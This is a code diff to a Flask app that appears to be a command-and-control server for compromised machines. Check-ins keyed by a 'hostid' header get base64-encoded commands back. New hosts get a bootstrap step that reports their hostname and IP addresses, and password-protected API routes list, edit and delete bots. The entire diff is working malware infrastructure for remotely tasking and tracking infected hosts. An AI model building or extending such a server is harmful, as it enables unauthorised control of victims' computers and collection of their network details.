@@ -36,10 +36,13 @@ def requires_auth(f):
 
 class HostBot(db.Model):
     id = db.Column(db.Integer, primary_key=True)
+    hostid = db.Column(db.String, index=True)
     hostname = db.Column(db.String(100))
     resp = db.Column(db.String)
     last_cb = db.Column(db.DateTime)
     cb_host = db.Column(db.String)
+    ip = db.Column(db.String(60))
+    bootstrapped = db.Column(db.Boolean, default=False)
 
     @hybrid_property
     def resp_b64(self):
@@ -50,6 +53,7 @@ class HostBot(db.Model):
         return [
                    str(self.id),
                    self.hostname,
+                   self.ip,
                    self.cb_host,
                    self.last_cb.strftime('%m/%d/%Y %I:%M:%S %p'),
                    self.resp
@@ -57,17 +61,31 @@ class HostBot(db.Model):
 
 @app.route('/<route>')
 def cb(route):
-    hostname = request.headers.get("hostid", None)
-    if not hostname:
+    hostid = request.headers.get("hostid", None)
+    if not hostid:
         return abort(403)
-    b = HostBot.query.filter_by(hostname=hostname, cb_host=request.host).first()
+    b = HostBot.query.filter_by(hostid=hostid).one_or_none()
     if not b:
-        b = HostBot(hostname=hostname, resp="")
+        b = HostBot(hostid=hostid, resp=render_template("bootstrap.html", url=request.url_root+url_for('bootstrap', hostid=hostid)[1:]))
     b.cb_host = request.host
     b.last_cb = datetime.now()
     db.session.add(b)
     db.session.commit()
-    return b.resp_b64
+    return b.resp_b64 if b.resp else b64e("exit")
+
+@app.route('/bootstrap/<hostid>', methods=["POST"])
+def bootstrap(hostid):
+    b = HostBot.query.filter_by(hostid=hostid).one_or_none()
+    if not b or b.bootstrapped:
+        return abort(403)
+    b.hostname = request.form.get("hn")
+    # just cut out ipv6 for now...
+    b.ip = ",".join([i for i in request.form.get("ip").split(",") if i.find(":")==-1])
+    b.bootstrapped = True
+    b.resp = ""
+    db.session.add(b)
+    db.session.commit()
+    return '', 200
 
 @app.route('/api/delete/<int:id>', methods=["GET"])
 @requires_auth
@@ -101,13 +119,13 @@ def update(id):
     db.session.add(b)
     db.session.commit()
     return '', 200
-    
+
 
 @app.route('/api/json')
 @requires_auth
 def json_api():
-    return jsonify({"data": [i.serialize for i in HostBot.query.all()]})
-    
+    return jsonify({"data": [i.serialize for i in HostBot.query.filter_by(bootstrapped=True)]})
+
 
 @app.route('/')
 @requires_auth
@@ -118,4 +136,4 @@ def index():
 if __name__ == '__main__':
     db.create_all()
     db.session.commit()
-    app.run(host='0.0.0.0', port=80)
+    app.run(host='0.0.0.0', port=8000)
